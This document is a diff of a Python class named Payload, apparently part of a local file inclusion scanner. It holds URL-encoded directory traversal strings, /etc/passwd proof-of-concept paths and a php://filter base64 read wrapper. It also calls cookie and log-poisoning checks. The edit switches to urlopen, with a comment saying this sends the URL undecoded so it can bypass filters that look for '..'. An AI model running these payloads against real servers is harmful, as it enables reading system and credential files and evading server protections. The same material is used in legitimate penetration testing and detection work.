@@ -2,21 +2,22 @@ from UAList import fetchUA
 import re
 import requests
 from urllib.parse import quote
+from urllib.request import urlopen
 from termcolor import colored
 
 
 class Payload:
 
-	def __init__(self, url, initiate=True, poc=[quote("/etc/passwd"), "/etc/passwd%00"], verbosity=1):
-		self.url = url
+	def __init__(self, url, initiate=True, poc=["%2Fetc%2Fpasswd", "%2Fetc%2Fpasswd%00"], verbosity=1):
+		self.url = url.strip()
 		self.verbosity = verbosity
 		# The quote method automatically url encodes the string
-		self.linux_dirTraversal = [quote("../../../../../../.."), quote("/../../../../../../.."), quote("....//....//....//....//....//....//..../"), quote("//....//....//....//....//....//....//..../"), quote(".././.././.././.././.././.."), quote("/.././.././.././.././.././..")]
+		self.linux_dirTraversal = ["%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E"]
 		# poc -> Proof Of Concept (Change it if you want)
 		self.poc = poc
 
 		# Filter
-		self.filterPaths = [quote("/etc/passwd"), quote("index"), quote("index.php"), quote("index.html")]
+		self.filterPaths = ["%2Fetc%2Fpasswd", quote("index"), quote("index.php"), quote("index.html")]
 		self.filterBase = quote("php://filter/read=convert.base64-encode/resource=")
 
 		# Headers. One is without url encoding beacause it encodes also the base64 and the server doesn't like that
@@ -37,10 +38,11 @@ class Payload:
 			self.filterCheck()
 			self.cookieCheck()
 			self.logPoisonCheck()
-
+			
+	# DON'T touch it, it sends the url as is without decoding it first, so that it can bypass filters that look for ..
 	def hit(self, url):
-		response = requests.get(url, headers=fetchUA())
-		response = response.text
+		response = urlopen(url)
+		response = str(response.read())
 		return self.stripHtmlTags(response)
 
 	# Checks if the url is valid
